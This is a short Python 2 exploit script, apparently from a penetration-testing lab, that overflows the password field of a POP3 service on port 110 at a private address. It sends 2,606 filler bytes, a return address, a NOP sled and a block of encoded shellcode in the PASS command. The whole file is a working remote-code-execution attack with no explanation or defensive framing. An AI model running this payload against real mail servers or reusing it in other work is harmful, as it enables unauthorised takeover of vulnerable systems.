#!/usr/bin/python

import socket

shell = (
"\xdb\xdb\xd9\x74\x24\xf4\x5d\xbb\x4d\xfa\xc3\xcf\x2b\xc9\xb1"
"\x52\x31\x5d\x17\x03\x5d\x17\x83\x88\xfe\x21\x3a\xee\x17\x27"
"\xc5\x0e\xe8\x48\x4f\xeb\xd9\x48\x2b\x78\x49\x79\x3f\x2c\x66"
"\xf2\x6d\xc4\xfd\x76\xba\xeb\xb6\x3d\x9c\xc2\x47\x6d\xdc\x45"
"\xc4\x6c\x31\xa5\xf5\xbe\x44\xa4\x32\xa2\xa5\xf4\xeb\xa8\x18"
"\xe8\x98\xe5\xa0\x83\xd3\xe8\xa0\x70\xa3\x0b\x80\x27\xbf\x55"
"\x02\xc6\x6c\xee\x0b\xd0\x71\xcb\xc2\x6b\x41\xa7\xd4\xbd\x9b"
"\x48\x7a\x80\x13\xbb\x82\xc5\x94\x24\xf1\x3f\xe7\xd9\x02\x84"
"\x95\x05\x86\x1e\x3d\xcd\x30\xfa\xbf\x02\xa6\x89\xcc\xef\xac"
"\xd5\xd0\xee\x61\x6e\xec\x7b\x84\xa0\x64\x3f\xa3\x64\x2c\x9b"
"\xca\x3d\x88\x4a\xf2\x5d\x73\x32\x56\x16\x9e\x27\xeb\x75\xf7"
"\x84\xc6\x85\x07\x83\x51\xf6\x35\x0c\xca\x90\x75\xc5\xd4\x67"
"\x79\xfc\xa1\xf7\x84\xff\xd1\xde\x42\xab\x81\x48\x62\xd4\x49"
"\x88\x8b\x01\xdd\xd8\x23\xfa\x9e\x88\x83\xaa\x76\xc2\x0b\x94"
"\x67\xed\xc1\xbd\x02\x14\x82\xcb\xd9\x16\x68\xa4\xdf\x16\x8d"
"\x8f\x69\xf0\xe7\xff\x3f\xab\x9f\x66\x1a\x27\x01\x66\xb0\x42"
"\x01\xec\x37\xb3\xcc\x05\x3d\xa7\xb9\xe5\x08\x95\x6c\xf9\xa6"
"\xb1\xf3\x68\x2d\x41\x7d\x91\xfa\x16\x2a\x67\xf3\xf2\xc6\xde"
"\xad\xe0\x1a\x86\x96\xa0\xc0\x7b\x18\x29\x84\xc0\x3e\x39\x50"
"\xc8\x7a\x6d\x0c\x9f\xd4\xdb\xea\x49\x97\xb5\xa4\x26\x71\x51"
"\x30\x05\x42\x27\x3d\x40\x34\xc7\x8c\x3d\x01\xf8\x21\xaa\x85"
"\x81\x5f\x4a\x69\x58\xe4\x6a\x88\x48\x11\x03\x15\x19\x98\x4e"
"\xa6\xf4\xdf\x76\x25\xfc\x9f\x8c\x35\x75\xa5\xc9\xf1\x66\xd7"
"\x42\x94\x88\x44\x62\xbd")
buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 16 + shell
#Send all the strings made
print "\n[*]Sending evil buffer"
  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.11.10.130', 110))
s.recv(1024)
s.send('USER test\r\n')
s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
s.send('QUIT\r\n')
s.close()

print "\nDone!"
